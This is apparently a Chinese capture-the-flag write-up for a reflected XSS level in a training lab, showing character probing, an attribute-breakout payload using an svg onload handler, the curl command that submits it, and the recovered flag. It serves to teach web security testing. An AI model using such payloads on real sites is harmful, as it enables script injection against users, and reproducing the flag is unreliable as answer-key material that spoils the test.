## 题解

### 入口与指纹

`Werkzeug/1.0.1` + `Python/2.7.18`，Dalgona 靶场第 3 关（`static/css/xss/xss3.css`）。
入口 `GET /page?name=`，反射点在**输入框的 value 属性**里：

```html
<input type=text name=name placeholder="Enter your name..." value="TESTX">
```

### 关键观察

逐字符探测（提交 `Q<ch>Q` 看 value 里剩下什么）：`<` `>` `"` `'` `/` 空格 `(` `)` `=` `;` 反引号
**全部原样保留**，没有任何过滤或编码。

所以只需要先闭合属性、再闭合标签，然后挂一个事件处理器。

### 利用链

```bash
T=$(head -1 .target)
curl -sS --get --data-urlencode 'name="><svg onload=alert("XSS")>' "http://$T/page" \
| grep -o 'flag{[^}]*}'
# flag{368502fa-a8a2-4176-9840-50b145481063}
```

payload 展开后：

```html
<input ... value=""><svg onload=alert("XSS")>">
```

### flag 位置

`/page` 成功响应里 `Here is the flag:` 之后。

## 复盘

- **属性上下文先闭合引号和标签**：`">` 一次同时结束 `value="…"` 和 `<input>`。
- **`<svg onload>` 比 `<script>` 稳。** 反射点在一个已经打开的 `<form>` 内部，
  `<script>` 也能执行，但 `<svg onload>` 不依赖解析器对脚本的处理顺序。
- 探测阶段只要看「哪些字符被吞」，这里一个都没吞，直接构造即可。
